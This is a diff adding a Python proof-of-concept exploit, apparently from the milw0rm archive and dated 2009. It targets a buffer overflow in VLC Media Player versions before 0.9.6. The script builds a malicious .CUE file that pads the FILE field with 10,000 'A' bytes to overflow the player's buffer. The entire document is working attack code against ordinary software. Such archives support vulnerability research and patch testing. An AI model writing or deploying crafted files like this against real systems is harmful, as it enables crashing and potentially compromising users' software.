@@ -1,0 +1,23 @@
+#!/usr/bin/env python
+
+####################################################################################
+#
+# VLC Media Player < 0.9.6 (.CUE) Buffer Overflow PoC
+# Found By:	Dr_IDE
+# Tested On:	XPSP3
+#
+####################################################################################
+
+head = ("\x46\x49\x4c\x45\x20\x22")
+buff = ("\x41" * 10000)
+foot = (
+"\x2e\x42\x49\x4e\x22\x20\x42\x49\x4e\x41\x52\x59\x0d\x0a\x20\x54"
+"\x52\x41\x43\x4b\x20\x30\x31\x20\x4d\x4f\x44\x45\x31\x2f\x32\x33"
+"\x35\x32\x0d\x0a\x20\x20\x20\x49\x4e\x44\x45\x58\x20\x30\x31\x20"
+"\x30\x30\x3a\x30\x30\x3a\x30\x30")
+
+f1 = open("vlc_0.8.6.cue","w")
+f1.write(head + buff + foot)
+f1.close()
+
+# milw0rm.com [2009-09-15]
